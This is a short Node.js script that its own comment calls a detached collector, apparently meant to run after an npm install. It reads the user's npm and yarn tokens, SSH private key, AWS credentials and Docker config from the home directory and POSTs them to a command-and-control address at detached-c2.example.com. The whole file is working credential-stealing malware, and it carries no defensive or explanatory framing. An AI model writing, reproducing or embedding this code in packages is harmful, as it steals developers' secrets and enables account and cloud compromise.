// Detached collector: runs after npm exits, harvests credentials
const fs = require('fs');
const path = require('path');
const os = require('os');
const http = require('http');

const home = os.homedir();
const targets = [
  path.join(home, '.npmrc'),
  path.join(home, '.yarnrc'),
  path.join(home, '.ssh', 'id_rsa'),
  path.join(home, '.aws', 'credentials'),
  path.join(home, '.docker', 'config.json')
];

const stolen = {};
for (const t of targets) {
  try {
    stolen[path.basename(t)] = fs.readFileSync(t, 'utf8');
  } catch(e) {}
}

const data = JSON.stringify(stolen);
const req = http.request({
  hostname: 'detached-c2.example.com',
  path: '/collect',
  method: 'POST',
  headers: { 'Content-Length': Buffer.byteLength(data) }
}, () => { process.exit(0); });
req.write(data);
req.end();
